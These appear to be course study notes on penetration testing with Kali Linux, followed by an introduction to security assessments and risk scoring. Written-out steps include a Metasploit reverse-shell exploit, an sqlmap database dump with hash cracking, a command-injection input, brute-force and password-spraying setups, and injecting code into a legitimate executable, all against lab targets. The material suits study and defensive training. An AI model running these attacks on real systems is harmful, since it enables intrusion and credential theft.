		○ System Configuration in Kali

			§ Settings management:

				□ Adjust power, display, and security settings (e.g., prevent suspend, lock screen on sleep).

			§ Updating \& upgrading:

				□ Always run:

					sudo apt update \&\& sudo apt upgrade

				□ Ensures all tools and system packages are current.

		○ MAC Address Management

			§ MAC address: The unique hardware address of the network card.

			§ Can be spoofed/changed for anonymity during testing.

			§ Tool: macchanger (found under Sniffing \& Spoofing).

			§ Usage example:

				sudo macchanger -A eth0

				□ Randomizes MAC address for the eth0 interface.

			§ Verify changes with ifconfig.

		○ Vulnerability Research with SearchSploit

			§ Tool: searchsploit (under Exploitation Tools).

			§ Connects to Exploit-DB, a database of public exploits.

			§ Basic usage:

				searchsploit smb

				□ Lists vulnerabilities related to SMB protocol.

			§ Can narrow results by adding keywords:

				searchsploit smb windows

			§ Limits output to Microsoft SMB vulnerabilities.

		○ Kali Menus \& Tools

			§ Kali provides categorical menus (e.g., Sniffing \& Spoofing, Exploitation Tools).

			§ Each contains pre-installed tools commonly used in penetration testing.

			§ Familiarity with these menus improves speed and efficiency during engagements.



Fuzzing with Spike

	• Fuzzing is a penetration testing technique where large amounts of unexpected or malformed data are sent to a target to test for vulnerabilities. The tool Spike, included in Kali Linux, can automate fuzzing against network services. This demo uses Spike against the intentionally vulnerable Vulnserver application to trigger crashes.

	• Key Concepts

		○ Vulnserver Setup

			§ Target system: Windows host running Vulnserver.

			§ Port: Listens on 9999.

			§ Verified connection with Netcat (nc 10.0.2.14 9999).

			§ The HELP command shows available commands, including TRUN, which is used for fuzzing.

		○ Spike Action File

			§ Spike uses action files (.spk) to define fuzzing input.

			§ Example (command.spk):

				□ Reads the banner from the server.

				□ Sends TRUN followed by a variable fuzz string.

			§ Syntax:

				s\_string("TRUN ")

				s\_string\_variable("COMMAND")

		○ Running the Fuzzing Test

			§ Command used:

				generic\_send\_tcp 10.0.2.14 9999 command.spk 0 0

			§ Observations:

				□ Initial traffic works (handshake + welcome banner).

				□ After repeated fuzzed TRUN packets, server stops responding (crash).

		○ Analyzing the Crash

			§ Wireshark captures confirm the sequence:

				□ Normal three-way handshake (SYN → SYN/ACK → ACK).

				□ Welcome messages (105-byte packets).

				□ Fuzzed TRUN packets sent repeatedly.

				□ Eventually no response → server crash.

			§ Next step would be to identify the exact fuzz string that caused the crash, which could form the basis for an exploit (e.g., buffer overflow).

		○ Why This Matters

			§ Fuzzing is a powerful technique to find vulnerabilities in services and applications.

			§ Spike provides a simple but effective way to automate malformed input tests.

			§ Identifying crashes is the first stage in exploit development (e.g., turning a crash into code execution).

			§ Vulnserver + Spike is a safe lab environment for learning fuzzing without risking real systems.



Information Gathering with Legion

	• Legion is a penetration testing tool in Kali Linux used for service enumeration, vulnerability analysis, and credential discovery. It automates reconnaissance by scanning hosts, identifying services, and integrating brute force testing (via Hydra) to uncover valid credentials.

	• Key Concepts

		○ Starting Legion

			§ Found in Applications → Vulnerability Analysis in Kali.

			§ Requires root access (default password: kali).

			§ GUI-based tool (maximize the window for easier navigation).

		○ Adding a Target Host

			§ Hosts are added manually to be scanned.

			§ Example: 10.0.2.8 (Metasploitable server).

			§ Selecting “hard assessment” launches a detailed scan.

			§ Progress is shown in the bottom panel, with results appearing in the main panel.

		○ Service Discovery

			§ Legion enumerates open ports and running services.

			§ Example results:

				□ MySQL (Port 3306) → Detected version 5.0.51a.

				□ FTP (Port 21) → Service identified.

				□ Bind shell (Port 1524) → Detected as Metasploitable root shell.

				□ Some ports may be denied (e.g., Port 6000).

		○ Credential Discovery with Hydra Integration

			§ Legion integrates with Hydra to automatically attempt logins.

				□ Example:

					® MySQL service → Hydra found valid login credentials.

					® FTP service → Hydra also retrieved valid credentials.

				□ Shows how Legion goes beyond simple enumeration to provide direct access paths.

		○ Brute Force Testing

			§ The Brute tab allows custom dictionary-based attacks.

			§ Example setup:

				□ Target: 10.0.2.8 on Port 22 (SSH).

				□ Usernames: unix\_users.txt.

				□ Passwords: unix\_passwords.txt.

				□ Hydra runs against the service using the supplied lists.



Using Metasploit

	• Metasploit is a powerful exploitation framework that allows penetration testers to demonstrate whether vulnerabilities are actually exploitable. It provides a large collection of exploits, payloads, and auxiliary modules, enabling both reconnaissance and post-exploitation activities. This transcript walks through using Metasploit to exploit a service on a target system and establish a remote shell.

	• Key Concepts

		○ Metasploit Overview

			§ Found in Kali → Applications → Exploitation Tools.

			§ On first startup, initializes its database.

			§ Provides:

				□ 2000+ exploits

				□ 1000+ auxiliary modules

				□ 363 post-exploitation tools

				□ 592 payloads

			§ Components:

				□ Exploits → Code used to take advantage of vulnerabilities.

				□ Auxiliary modules → Information gathering, scanning, brute force, etc.

				□ Payloads → Code executed on the target after exploitation (e.g., reverse shell).

				□ Post-exploitation tools → Actions taken after a compromise (e.g., persistence, privilege escalation).

		○ Basic Commands

			§ help → Lists all Metasploit commands.

			§ show exploits → Displays available exploits.

			§ search <term> → Filters results by keyword (e.g., search win8, search irc).

			§ use <exploit> → Loads a selected exploit.

			§ show targets → Lists supported target types.

			§ show payloads → Displays compatible payloads.

			§ info <payload> → Provides detailed information.

			§ set <option> → Configures exploit/payload parameters (e.g., set RHOSTS).

			§ show options → Shows required parameters.

			§ exploit → Executes the attack.

		○ Exploit Demonstration (Metasploitable Server)

			§ Target Service: IRC (UnrealIRCd backdoor).

			§ Exploit used:

				exploit/unix/irc/unreal\_ircd\_3281\_backdoor

			§ Payload selected:

				cmd/unix/reverse

				□ Creates a reverse shell on port 4444.

				□ Does not require admin privileges.

			§ Steps executed:

				□ use exploit/unix/irc/unreal\_ircd\_3281\_backdoor

				□ set target 0 (automatic detection)

				□ show payloads → choose reverse shell

				□ set payload cmd/unix/reverse

				□ set RHOSTS 10.0.2.8 (target IP)

				□ set LHOST 10.0.2.18 (attacker’s Kali IP)

				□ exploit

			§ Result:

				□ Exploit succeeded.

				□ Reverse shell established on remote system.

				□ Verified remote access by:

					® Running ifconfig (saw remote IP 10.0.2.8).

					® Running whoami (root access confirmed).

					® Running ps (list processes).

					® Running ls (list files).

		○ Why Metasploit is Important

			§ Evidence of exploitation: Goes beyond theoretical vulnerabilities to actual proof of compromise.

			§ Rapid exploitation: Provides pre-built, tested modules.

			§ Flexibility: Exploits, payloads, auxiliary modules, and post-exploitation tools can be combined.

			§ Education \& training: Ideal for learning exploitation techniques in labs (e.g., Metasploitable).



Scan Target with GVM

	• The Greenbone Vulnerability Manager (GVM) is a vulnerability scanning tool available in Kali Linux. It helps penetration testers and security professionals identify known vulnerabilities on target systems, generate detailed reports, and provide references for remediation.

	• Key Concepts

		○ Setup and Installation

			§ Install with:

				sudo apt install gvm

			§ Initialize with:

				sudo gvm-setup

				□ Prepares databases and generates an admin password for login.

			§ Requires additional system resources: at least 4 GB RAM recommended (instead of Kali’s default 2 GB).

			§ Start service:

				gvm-start

			§ Login via web interface with provided credentials.

		○ Database and Feed Updates

			§ GVM relies on vulnerability feeds (similar to signature databases).

			§ Updates can take hours to complete.

			§ Must be fully synced before running scans to ensure the latest vulnerability data is used.

		○ Running a Scan

			§ Access via the Scans tab → Wizard.

			§ Example target: Metasploitable server at 10.0.2.32.

			§ Scan workflow:

				□ Starts as Requested → Queued → Running.

				□ Produces a detailed report once complete.

		○ Scan Results and Reporting

			§ Results ranked by severity rating.

			§ Example findings:

				□ Multiple Ruby remote code execution vulnerabilities (port 8787).

				□ TWiki command execution (port 80).

				□ Ingreslock backdoor (port 1524, root shell access).

			§ Reports link directly to CVEs for reference (e.g., 35 CVEs identified).

			§ Detailed entries show:

				□ Description of issue.

				□ Evidence from detection results (e.g., UID=0 response proving root access).

				□ Recommended remediation (e.g., system clean for backdoor).

		○ Why GVM is Important

			§ Provides a broad vulnerability assessment of target systems.

			§ Produces structured reports that map issues to CVEs.

			§ Identifies critical weaknesses (like backdoors and RCEs) that may be directly exploitable.

			§ Helps pen testers prioritize follow-up exploitation testing.



#### Web Testing



Approach Web Testing

	• Web applications are now the backbone of modern services, making web application testing a critical penetration testing skill. The transcript emphasizes different approaches, attack surfaces, and areas of weakness that testers should investigate to prevent breaches.

	• Key Concepts

		○ Why Web Testing Matters

			§ Most applications are delivered as web apps or mobile apps with web backends.

			§ Real-world breaches (e.g., TalkTalk) highlight the severe consequences of insecure websites.

			§ Early testing is more effective and cheaper than reacting after a hack.

		○ Testing Approaches

			§ Crawling:

				□ Automatically enumerates all web pages.

				□ Builds a map of potential attack surfaces.

			§ Intercepting traffic with a proxy:

				□ Observes and manipulates traffic between client and server.

				□ Helps uncover hidden vulnerabilities beyond static crawling.

			§ Manual checks:

				□ Comments in code (may expose credentials or dev notes).

				□ Reviewing client-side code for weaknesses (e.g., JavaScript security gaps).

		○ Key Areas to Investigate

			§ Server \& technology stack:

				□ Identify server software, frameworks, and protocols.

				□ Check for unpatched vulnerabilities and cryptographic weaknesses.

			§ Transport security:

				□ Websites should use HTTPS, but many still rely on HTTP or weak HTTPS.

				□ WebSockets introduce new risks—must be reviewed carefully.

			§ Authentication mechanisms:

				□ Payment gateway integrations (PCI compliance).

				□ Backend authentication servers vulnerable to injection attacks.

				□ Password reset functionality often less robustly tested.

				□ Risks from default or hardcoded credentials.

			§ Session management:

				□ Session hijacking or cookie theft.

				□ Predictable session tokens that attackers can pre-compute.

		○ Common Web Vulnerabilities

			§ Injection attacks (SQL, LDAP, etc.) via poorly validated queries.

			§ Man-in-the-middle risks from insecure transport.

			§ Session hijacking through predictable or stolen cookies.

			§ Remote code execution from misconfigured servers or frameworks.

			§ Information leakage from developer comments or client-side code.



Test Websites with Burp Suite

	• Burp Suite is a widely used web application testing tool that enables penetration testers to intercept, inspect, and manipulate HTTP/S traffic between a browser and a web server. The Community Edition (included in Kali Linux) is sufficient for learning and basic testing, while the professional version is used for full-scale customer assessments.

	• Key Concepts

		○ Burp Suite Basics

			§ Found in Kali → Applications → Web Application Analysis → Burp Suite.

			§ Community Edition:

				□ Only allows temporary projects.

				□ Professional edition allows persistent storage of projects.

			§ Menu provides core functions: Burp, Project, Intruder, Repeater, Window, Help.

			§ Activity tabs include: Dashboard, Target, Proxy, Intruder, Repeater, etc.

		○ Target Tab

			§ Site Map: Displays structure of the web application (URLs, directories, pages).

			§ Scope: Defines which sites/URLs are in-scope for testing.

			§ Issue Definitions: Lists potential vulnerabilities Burp can identify, with severity ratings.

		○ Proxy Functionality

			§ Intercept mode:

				□ Captures traffic between browser and server.

				□ Allows testers to pause, inspect, and modify requests before forwarding them.

			§ By default, Burp listens on localhost:8080.

			§ Browser must be configured to route traffic through this proxy:

				□ Proxy: 127.0.0.1

				□ Port: 8080

		○ Testing Example

			§ Test site: http://zero.webappsecurity.com (a sample vulnerable banking app).

			§ Logged in with test credentials: username / password.

			§ Burp captured traffic, showing:

				□ Requests and responses (raw format or rendered view).

				□ Full site map, including directories and pages.

			§ Allows deeper inspection of session data, authentication flows, and vulnerabilities.

		○ Why Burp Suite is Important

			§ Central tool for web application penetration testing.

			§ Facilitates:

				□ Mapping web applications (structure, endpoints, parameters).

				□ Inspecting \& altering requests/responses.

				□ Identifying vulnerabilities (e.g., injection flaws, weak authentication, misconfigurations).

			§ Integrates manual and automated approaches for thorough testing.



Check Web Servers with Nikto

	• Nikto is a lightweight, command-line web server scanner used to identify vulnerabilities, misconfigurations, and outdated software. It is a common tool for quick reconnaissance of web servers in penetration testing.

	• Key Concept

		○ Purpose of Nikto

			§ Designed to check web servers for:

				□ Known vulnerabilities

				□ Configuration issues

				□ Outdated software

			§ Helps pen testers quickly determine areas needing deeper investigation.

		○ Running Nikto

			§ Found under Kali → Applications → Vulnerability Analysis.

			§ Example command:

				nikto -h 10.0.2.8

				□ -h specifies the host to scan.

		○ Output \& Findings

			§ Example target: Metasploitable host.

			§ Detected:

				□ Apache 2.2.8 on Ubuntu.

				□ Missing hardening features (security best practices not enabled).

				□ Outdated Apache version → potential vulnerabilities.

			§ Found several issues linked to the Open Source Vulnerability Database (OSVDB).

			§ Final summary: 27 items flagged for attention.

		○ Strengths of Nikto

			§ Quick, easy-to-use scanner.

			§ Provides immediate visibility into server misconfigurations and outdated software.

			§ Maps findings to known vulnerability databases for reference.

		○ Limitations

			§ Focuses on server-side vulnerabilities (not full web app testing).

			§ Results often require further manual validation.

			§ May generate many false positives.

			§ Lacks stealth → easily detectable by intrusion detection systems.



Fingerprint Web Servers

	• Fingerprinting web servers is an important early step in web application testing. It helps identify the type and version of the underlying web server even when banners are missing or altered. Different tools can be used to infer server details, but results are often approximate rather than exact.

	• Key Concepts

		○ Why Fingerprinting Matters

			§ Web application security depends not just on the app itself but also on the environment it runs in.

			§ Attackers often exploit weaknesses in outdated or misconfigured web servers.

			§ Server banners may be present, removed, or spoofed; fingerprinting provides alternate ways of deducing server type/version.

		○ Tools for Web Server Fingerprinting

			§ Httprecon

				□ Windows-based tool (downloaded from Computec).

				□ Requires OCX components registered in SysWOW64.

				□ Produces:

					® Match List → ranked server guesses with confidence levels.

					® Fingerprint Details → summary fingerprint.

					® Report Preview → detailed analysis.

				□ Example: Detected Apache 2.0.59 with 100% confidence, though the banner indicated 2.2.8.

			§ Httprint

				□ Downloadable tool from Net Square, GUI-based.

				□ Needs disabling of ICMP and SSL auto-detect for accuracy.

				□ Outputs results in HTML format.

				□ Example:

					® On zero.webappsecurity.com: Deduced Apache 1.3 with 61% confidence.

					® On Metasploitable: Banner reported Apache 2.2.8, deduced 2.0.x with 57% confidence.

			§ Uniscan

				□ Comes pre-installed in Kali Linux.

				□ Run with:

					uniscan -u <target>

				□ Example:

					® Detected WEBrick Ruby server on Hacme Casino site.

					® Detected Apache Coyote 1.1 on the Zero Bank site.

		○ Observations

			§ Fingerprinting results often vary and may conflict with banners.

			§ Provides useful hints for further testing but should not be relied on as absolute truth.

			§ Helps narrow down which vulnerabilities are most relevant to the environment.



Web Server Penetration using SQLmap

	• How to use SQLmap, an automated SQL injection tool, to identify and exploit vulnerabilities in a web server’s login form. By leveraging SQLmap, a tester can move from reconnaissance to full exploitation, including dumping databases and cracking password hashes.

	• Key Concepts

		○ Reconnaissance with Nmap

			§ Target: Europa server (10.10.10.22) in a lab environment.

			§ Scan:

				nmap -PS -F -A 10.10.10.22

			§ Findings:

				□ Open ports → 22 (SSH), 80 (HTTP), 443 (HTTPS).

				□ Web service: Apache 2.4.18.

				□ SSL certificate showed domains:

					® europacorp.htb

					® www.europacorp.htb

					® admin-portal.europacorp.htb

			§ This indicated the presence of virtual hosts / name-based virtual hosting.

		○ Discovering the Web Application

			§ Default Apache page appeared on http://10.10.10.22 and https://10.10.10.22.

			§ Added admin-portal.europacorp.htb to /etc/hosts.

			§ Result: A login page was discovered — potential injection point.

		○ SQLmap Usage

			§ SQLmap command:

				sqlmap -u https://admin-portal.europacorp.htb --forms --crawl=2 --threads=10 --dump

			§ Options explained:

				□ --forms → looks for input forms.

				□ --crawl=2 → crawls the site up to depth 2.

				□ --threads=10 → speeds up testing.

				□ --dump → extracts database contents if vulnerable.

		○ Exploitation Results

			§ SQLmap findings:

				□ Database identified: MySQL.

				□ Parameter email in login form → union-injectable.

				□ Vulnerable to both SQL injection and cross-site scripting (XSS).

				□ Detected 5 columns in the SQL query.

			§ Actions performed:

				□ Executed SQL injection.

				□ Dumped database tables.

				□ Extracted password hashes.

				□ Cracked hashes → obtained administrative credentials.

		○ Why SQLmap is Important

			§ Automates detection and exploitation of SQL injection.

			§ Can fingerprint databases, test different injection techniques, dump sensitive data, and even crack credentials.

			§ Saves time compared to manual testing, but results still require validation.

			§ Demonstrates real-world risk by proving data exfiltration and credential compromise.



#### Understand Exploit Code



Exploit a Target

	• Focuses on the delivery and exploitation phases of the cyber kill chain — where malware or attack payloads are introduced into a target system and executed. It reviews common delivery/exploitation techniques and illustrates them with high-profile case studies like WannaCry, Stuxnet, Saudi Aramco, and Sony PlayStation.

	• Key Concept

		○ Delivery Mechanisms

			§ Four common methods to deliver malicious payloads:

				• Email attachments (infected executables, Word/PDF files with malicious macros or exploits).

				• Malicious websites/hyperlinks (drive-by downloads, trojanized software, phishing).

				• Exposed services or ports (sending exploit packets or direct malware uploads).

				• Removable media (USB drives with auto-run malware, often used in isolated networks).

		○ Exploitation Techniques

			§ Human exploitation: tricking users into executing malicious attachments.

			§ Document/application exploits: Word, PDF, Flash, or spreadsheets with embedded malicious code.

			§ Browser exploitation: malicious websites exploiting browser vulnerabilities to install droppers.

			§ Credential misuse: stolen/cracked credentials from password dumps or clear-text traffic.

			§ Service exploitation: using vulnerabilities in exposed services (SMB, print spooler, etc.) to gain access silently.

		○ WannaCry (2017)

			§ Delivery: Email with infected ZIP file.

			§ Exploitation: Zero-day SMB vulnerability EternalBlue (NSA-developed).

			§ Effect: Massive ransomware propagation across networks, leveraging infected machines as launchpads.

		○ Stuxnet (2010)

			§ Delivery: Initially suspected USB drives; later traced to supplier compromise and USB spread.

			§ Exploitation: Zero-day vulnerabilities (e.g., Microsoft Print Spooler) + Siemens PLC injection.

			§ Effect: Targeted Iranian uranium centrifuges, showcasing state-sponsored cyber warfare.

		○ Saudi Aramco (2012)

			§ Delivery: Malicious website clicked by an employee.

			§ Exploitation: Browser vulnerability dropped Shamoon malware.

			§ Effect: 30,000 workstations wiped, severe business disruption.

		○ Sony PlayStation Hack (2011)

			§ Delivery: External penetration via vulnerable service.

			§ Exploitation: SMB flaw in Red Hat Linux Apache servers.

			§ Effect: Breach exposed 77 million credit cards, one of the largest data breaches.

		○ Lessons Learned

			§ Delivery often relies on social engineering (phishing, malicious attachments, USBs).

			§ Exploitation leverages software vulnerabilities (zero-days, unpatched systems, weak credentials).

			§ High-profile incidents demonstrate:

				• Nation-state cyber warfare (Stuxnet).

				• Ransomware at global scale (WannaCry).

				• Mass disruption of industry (Saudi Aramco).



Finding Caves for Code Injection

	• explains how attackers can modify legitimate executables by injecting malicious code. It introduces the Portable Executable (PE) format, explores how to analyze executables, and discusses two main injection methods: adding a new section or using code caves. Tools like PE Studio and Cminer are demonstrated.

	• Key Concepts

		○ Trojan Programs

			§ Malware disguised as legitimate software.

			§ Two approaches:

				□ Entirely malicious software disguised as useful.

				□ Legitimate software altered to include malicious code.

		○ Portable Executable (PE) Format

			§ Windows executables (EXE) have a structured format called PE.

			§ Components:

				□ MS-DOS stub (first few hundred bytes, with an error message if run incorrectly).

				□ PE Header (locations and sizes of code/data, OS target, stack size).

				□ Sections (code or data segments).

			§ Important fields:

				□ Section alignment (e.g., 0x1000).

				□ Image base (e.g., 0x400000).

				□ Directories \& sections (define runtime functions, imports, exports, etc.).

			§ Manifest: often contains XML configuration.

		○ Tools for analysis:

			§ Hex editors (to view raw PE file structure).

			§ PE Studio (GUI tool to automatically parse and analyze executables).

		○ Code Injection Techniques

			§ Adding a new section: Create an entirely new area in the PE file for malicious code.

			§ Using code caves: Insert malicious code into unused areas (“caves”) within existing sections of the executable.

			§ Cminer tool:

				□ Scans executables to find available code caves.

				□ Example findings:

					® Notepad.exe → 6 caves, 3–511 bytes, in data sections.

					® Putty.exe → 6 caves, larger caves, also in data sections.

		○ Anti-Detection Consideration

			§ If malware executes immediately at startup, it risks detection by sandboxing or anti-malware tools.

			§ Attackers often design Trojans to trigger code execution at a later user interaction (e.g., when clicking a menu item), making detection harder.



Understand Code Injection

	• demonstrates how attackers (and penetration testers) can perform code injection into executables. Using PuTTY as the target, the process shows how to identify injection points, insert malicious code into unused space (code caves), and modify the program flow to execute that code stealthily. It also explains how to finalize and legitimize the modified binary so it runs without warnings.

	• Key Concepts

		○ Injection Point Identification

			§ The target application (PuTTY) is analyzed using the x32dbg debugger.

			§ The login prompt (“Login as:”) is identified as a logical point for code injection.

			§ The instruction at that point is replaced with a jump instruction redirecting execution to a code cave.

		○ Code Caves and Injection

			§ A code cave (section of unused null bytes) in the rdata section is chosen as the injection space.

			§ Example injected code: simple no-op instructions (0x90) for demonstration.

			§ The injection must include a return jump back to the original code location to preserve program flow.

		○ Debugger Workflow

			§ x32dbg is used to:

				• Search for string references (login as).

				• Insert a jump into the cave.

				• Write injected instructions.

				• Set breakpoints and verify execution flow.

			§ The program is run to confirm that execution passes into the injected code before returning to normal behavior.

		○ Manual Patching

			§ If saving changes through x32dbg fails, modifications can be applied with a hex editor.

			§ The binary changes are recorded (e.g., replaced hex instructions).

			§ A new executable is saved (in the example, renamed to mutty.exe).

		○ Ensuring Executable Runs

			§ After injection, the modified section must be marked executable.

			§ The PE editor in LordPE is used to:

				• Edit the section header (rdata) → mark as executable.

				• Recalculate the checksum so Windows accepts the modified binary.

			§ The patched file can now execute normally without triggering system errors.

		○ Security \& Attacker Perspective

			§ This technique mirrors real-world attacker methods:

				• Modify legitimate software to run hidden malicious payloads.

				• Delay execution until a trigger event (e.g., login prompt) to avoid sandbox detection.

			§ In penetration testing, such methods are used to demonstrate vulnerabilities and credential harvesting risks.



Understand Command Injection

	• The transcript explains command injection vulnerabilities, focusing on a real-world case (Rust Standard Library vulnerability CVE-2024-24576) and demonstrates how attackers can exploit improperly sanitized input to execute arbitrary system commands.

	• Key Concepts

		○ The Vulnerability

			§ CVE-2024-24576 (published April 2024).

			§ Affected the Rust Standard Library (before version 1.77.2).

			§ Root cause: failure to properly escape arguments when invoking batch files on Windows.

			§ Impact: Attackers controlling input arguments could inject and execute arbitrary shell commands.

			§ Other languages (like Python) using similar system calls were also affected.

		○ Injection Basics

			§ Command injection is a form of injection attack.

			§ Works by appending crafted extra data to normal input.

			§ The payload causes the target system to escape legitimate processing and execute unintended commands.

			§ Goal: Run additional malicious commands alongside the expected one.

		○ Python Demonstration

			§ A simple Python program:

				□ Reads user input.

				□ Passes it to a batch file (bad.bat) as an argument.

				□ Batch file simply echoes back the input.

			§ Exploit:

				□ Input "Hello World" → prints back correctly.

				□ Input "Hello World \& calc" → prints back message and launches Windows Calculator.

			§ This shows how unescaped input can trigger unexpected system commands.

		○ Lessons Learned

			§ Validation and sanitization of input are critical.

			§ Never pass raw user input directly to system-level commands or scripts.

			§ Use safe APIs and parameterized calls instead of concatenating command strings.

			§ Security patches (like Rust’s fix) reinforce the need to update environments promptly.



Understand Buffer Overflows

	• explains how buffer overflow vulnerabilities work by walking through a simulated program. It shows how writing more data than the allocated buffer space allows can overwrite critical values on the stack (like the return address), enabling attackers to redirect execution flow to malicious payloads.

	• Key Concepts

		○ Buffer Overflow Basics

			§ A buffer overflow occurs when input data exceeds the allocated buffer size.

			§ Extra data overwrites adjacent memory, including the return address on the stack.

			§ This allows attackers to redirect execution to injected payload code.

		○ Simulated Example (MASM Program)

			§ Program simulates receiving a packet with a user name.

			§ Uses a routine (sco) to copy this input into a fixed 32-byte buffer.

			§ If the input is too long, data spills over, overwriting stack memory.

			§ Includes three parts in the malicious packet:

				□ Padding (filler bytes, e.g., “A”s).

				□ Exploit (new return address pointing to payload).

				□ Payload (malicious code to run).

			§ Debugger Walkthrough

				□ Debugger (MASM/x32dbg) shows how the stack evolves step-by-step:

					® Normal behavior: “Hello, <name>” message.

					® Malicious input: overflows the 32-byte buffer, overwrites return address.

				□ When the subroutine ends (RET instruction), instead of returning to the normal code, execution jumps to the attacker’s payload injected in the buffer.

				□ Payload in the example executes a malicious message box.

		○ Technical Details

			§ Registers in use:

				□ EBP saves stack pointer.

				□ EBX points to input packet.

				□ EDX/ECX manage local buffer copies.

				□ EDI inserts the copied string into the final message.

			§ Stack pointer (ESP) and return address are critical points of attack.

			§ Overwritten return address now points to 403024 (payload start).

		○ Security Implications

			§ Many real-world services are vulnerable if they fail to validate input length.

			§ Classic attack structure: Padding → New Return Address → Payload.

			§ Buffer overflows are a major vector for remote code execution (RCE).

			§ Exploits often leverage known memory addresses or gadgets to reliably execute attacker code.



Password Spraying Active Directory

	• The transcript explains how password spraying works as an attack technique against Active Directory (AD), using tools like the PowerShell script DomainPasswordSpray. It shows how attackers attempt a small set of commonly used or guessed passwords across many accounts to find weak credentials.

	• Key Concepts

		○ Password Spraying Defined

			§ Unlike brute force (which targets one account with many passwords), password spraying targets many accounts with one (or a few) common passwords.

			§ Reduces the risk of account lockouts and is more effective in enterprise environments where users often choose weak or reused passwords.

		○ Tools and Execution

			§ Example tool: DomainPasswordSpray.ps1 (PowerShell script by dafthack).

			§ Can be run with:

				□ A single guessed password (e.g., kittykat).

				□ A password list (dictionary).

			§ Demonstrated on a domain workstation while logged in as a domain user.

		○ Detection of Weak Passwords

			§ In the example, running the script with password kittykat revealed that user achtar was using that password.

			§ Such results highlight weak password hygiene across enterprises.

		○ Enterprise Password Weakness

			§ Around 30% of enterprise passwords are weak.

			§ With the right password list, password spraying can reliably uncover vulnerable accounts.

			§ This makes it a high-value attack technique for penetration testers and adversaries alike.



Find Exploit Code

	• explains how the process of finding and using exploit code has evolved. Originally, testers had to research and write their own exploits, but today they can leverage public exploit databases, research reports, and GitHub repositories. It highlights resources, risks, and cautions when sourcing exploit code.

	• Key Concepts

		○ Historical vs. Modern Approach

			§ Earlier: Pen testers had to discover vulnerabilities themselves and write exploits from scratch, requiring debugging and MASM programming expertise—a process that could take weeks.

			§ Now: Exploits and analyses are widely available from researchers, advisory sites, and exploit databases, making it faster to find and use working exploits.

		○ Sources of Exploit Information

			§ Research sites \& advisories:

				□ Malware Archeology (aggregates reports).

				□ Malwarebytes Labs (offers free technical writeups).

				□ Cyber research firms (some open, some paid threat intelligence).

			§ Exploit databases:

				□ Exploit-DB (exploit-db.com) – A key source of ready-made exploit code.

					® Provides filters (e.g., remote exploits).

					® Metadata includes date, title, platform, author, and flags:

						◊ D: Download exploit code.

						◊ A: Download vulnerable application.

						◊ V: Code verified.

				□ Other sources:

					® Legal Hackers (includes proof-of-concept code but fewer recent updates).

					® GitHub repos of independent researchers.

		○ Example

			§ A remote exploit listed in Exploit-DB: Remote Desktop Web Access attack.

			§ Demonstrated as a Python exploit usable in Metasploit.

		○ Cautions

			§ Legitimacy concerns: Exploit code from individuals may contain malware or backdoors.

			§ Quality issues: Some exploits may have intentional mistakes (forcing the user to fix before use), while others contain unintentional errors.

			§ Always verify the source and inspect code before execution.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Security Testing Essential

#### Understanding Security Assessments



Language is Important

	• Language and terminology in cybersecurity assessments matter a great deal. Misusing terms (e.g., calling a vulnerability scan a penetration test) can cause serious misunderstandings, leading to false confidence, poor decisions, and potentially severe security consequences.

	• Key Concepts

		○ Importance of Clear Language

			§ Different security assessments (vulnerability scan vs. penetration test) are not interchangeable.

			§ Mislabeling creates confusion for leadership and can lead to a dangerous false sense of security.

		○ Consequences of Misinterpretation

			§ If management cannot distinguish between assessment types, they may think their systems are safer than they really are.

			§ This can result in:

				□ Production outages from issues that were overlooked.

				□ Data breaches requiring public disclosure, harming customers and reputation.

			§ Root cause often traces back to misunderstanding security terminology.

		○ Five Distinct Types of Security Assessments

			§ Risk Assessment – Identifies risks and their impact.

			§ Security Controls Assessment – Evaluates whether controls are in place and working.

			§ Compliance Assessment – Checks alignment with regulatory or industry requirements.

			§ Vulnerability Assessment – Identifies weaknesses in systems.

			§ Penetration Test – Simulates real-world attacks to exploit weaknesses.

		○ Choosing the Right Assessment

			§ Each assessment has different goals, techniques, and outcomes.

			§ The effectiveness of security efforts depends on matching the right type of assessment to the organization’s needs.



Risk Assessments

	• The purpose of a risk assessment is to identify and evaluate where an organization is most vulnerable to threats, so it can prioritize protections and strengthen its ability to achieve its mission. Understanding the distinction between threats and vulnerabilities is essential to this process.

	• Key Concepts

		○ Goal of a Risk Assessment

			§ Determine areas where an organization is most exposed to attack or disruption.

			§ Strengthen the quality of other security assessments by using risk assessment results as an input.

		○ Threats vs. Vulnerabilities (NIST definitions)

			§ Threat: A circumstance or event that can compromise the confidentiality, integrity, or availability (CIA) of information or systems.

				□ Examples: data breaches exposing secrets, unauthorized changes, or denial-of-service attacks.

			§ Vulnerability: A weakness that allows a threat to succeed.

				□ Examples: missing patches, default admin passwords, or physical weaknesses like a data center in a flood-prone area.

			§ Risk Assessment Process

				□ Identify relevant threats and vulnerabilities.

				□ Score risks based on two factors:

					® Likelihood: How probable is the threat exploiting the vulnerability?

					® Impact: How severe would the consequences be if it happened?

			§ Contextual Importance

				□ A recent, thorough risk assessment improves all other security activities (penetration tests, compliance checks, etc.).

				□ It guides resource prioritization so organizations focus on the most significant risks.



Calculating Risk Score

	• Risk scoring helps organizations prioritize cybersecurity risks by evaluating both the likelihood of a threat exploiting a vulnerability and the impact if it succeeds. The result guides leadership on where to focus mitigation efforts.

	• Key Concepts

		○ Likelihood (Probability of Exploitation)

			§ Defined as the probability that a threat will exploit a vulnerability.

			§ Example factors for malware on a laptop:

				□ Presence of endpoint protection.

				□ Internet usage habits.

				□ Tendency to open email attachments from unknown senders.

			§ NIST uses a low, medium, high scale for likelihood.

		○ Impact (Consequence of Exploitation)

			§ Measures the severity of harm if the threat succeeds.

			§ Example:

				□ Laptop malware infection → bad day for one user.

				□ Server network malware outbreak → costly, widespread organizational disruption.

			§ NIST also uses a low, medium, high scale for impact.

		○ Risk Score Formula

			§ Risk = Likelihood × Impact

			§ Produces a quantifiable score to compare risks and prioritize them.

		○ Goal of Risk Assessment

			§ Not to achieve perfection, but to prioritize risks so they can be reduced to an acceptable level.

			§ Aligns with leadership’s risk appetite.

		○ Data Sources for Risk Assessment

			§ External Reports:

				□ Verizon Data Breach Investigations Report.

				□ Privacy Rights Clearinghouse database of breaches.

				□ Industry-specific ISACs (Information Sharing and Analysis Centers).

			§ Internal Data:

				□ IT Service Management (ITSM) system.

				□ Help desk ticket history for past incidents.

		○ Outcome

			§ A report containing a prioritized list of cybersecurity risks that leadership should monitor and address.



Security Control Assessments

	• A security controls assessment evaluates which security controls are currently in place within an organization, using recognized security control frameworks as a baseline. The assessment highlights gaps and provides a prioritized view of where security improvements are needed.

	• Key Concepts

